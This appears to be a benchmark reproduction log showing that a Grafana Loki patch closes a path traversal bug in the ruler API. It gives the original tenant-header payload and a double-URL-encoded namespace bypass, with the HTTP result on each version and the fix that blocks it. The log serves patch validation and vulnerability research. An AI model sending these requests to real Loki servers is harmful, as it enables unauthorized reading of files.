PatchClosure-Bench repro — grafana-loki-cve-2026-21726
Date: 2026-07-17
Host: Docker 29.4.0 (OrbStack), macOS arm64
Images: REAL official grafana/loki:2.2.1 (V0) / 3.6.3 (V1) / 3.6.4 (V2)

Command:
  PCB_FLAG=PCB_FLAG_LOKI_<rand> python3 oracle.py --run-gate

Setup (no app/business code touched):
  * ruler.storage.type=local, ruler.storage.local.directory=/loki/rules-src, enable_api=true
  * auth_enabled=true  (X-Scope-OrgID honored -> drives the tenant-id ORIGINAL vector)
  * planted flag: /loki/pcb_flag.yaml = a VALID Loki ruler group whose group NAME is the
    per-run token, mounted ONE dir ABOVE the ruler store; readable only via traversal.
  * benign namespace /loki/rules-src/fake/legit.yaml so tenant "fake" is legitimate.
  Sink (identical across all versions):
    filepath.Join(<ruler store dir>, <tenant id = X-Scope-OrgID>, <namespace = URL segment>)

ORIGINAL (CVE-2021-36156, tenant-id input):
    GET /loki/api/v1/rules/pcb_flag.yaml   with  X-Scope-OrgID: ..
    -> Join("/loki/rules-src","..","pcb_flag.yaml") = /loki/pcb_flag.yaml
RESIDUAL (CVE-2026-21726, namespace input, double-URL-encoded):
    GET /loki/api/v1/rules/..%252f..%252fpcb_flag.yaml   with  X-Scope-OrgID: fake
    -> net/http decodes %25->% once (stays one segment, no 301) -> ..%2f..%2f...
    -> parseNamespace url.PathUnescape once -> ../../pcb_flag.yaml
    -> Join("/loki/rules-src","fake","../../pcb_flag.yaml") = /loki/pcb_flag.yaml

Observed (per-run flag retrieved iff traversal resolved):
  ORIGINAL  @ V0 (2.2.1): HTTP 200, response body contains flag        -> READ   (pre-fix)
  ORIGINAL  @ V1 (3.6.3): HTTP 500 "no org id"                         -> BLOCKED (CVE-2021-36156 fix: tenant-id path segments restricted)
  RESIDUAL  @ V1 (3.6.3): HTTP 200, response body contains flag        -> READ   (namespace sibling input unguarded -> CVE-2026-21726)
  RESIDUAL  @ V2 (3.6.4): HTTP 500 "invalid namespace: path traversal not allowed" -> BLOCKED (CVE-2026-21726 fix: filepath.IsLocal)

Negative controls (same V1 = 3.6.3):
  single-encoded namespace ..%2f..%2f  -> HTTP 301  (net/http percent-decodes %2f->/ then
  plain          namespace ../../      -> HTTP 301   redirects to the cleaned path; never
                                                     reaches the sink -> DOUBLE-encoding is REQUIRED)

Gate (validate_case + V2 residual close):
  original_poc_reaches_flag_on_v0 : true   (HTTP 200)
  original_poc_blocked_on_v1      : true   (HTTP 500 "no org id")
  residual_poc_reaches_flag_on_v1 : true   (HTTP 200)
  residual_poc_blocked_on_v2      : true   (HTTP 500 "invalid namespace: path traversal not allowed")
  PASSED = true

Teardown: docker compose down -v --rmi all (all 3 grafana/loki images removed) + image prune -f.
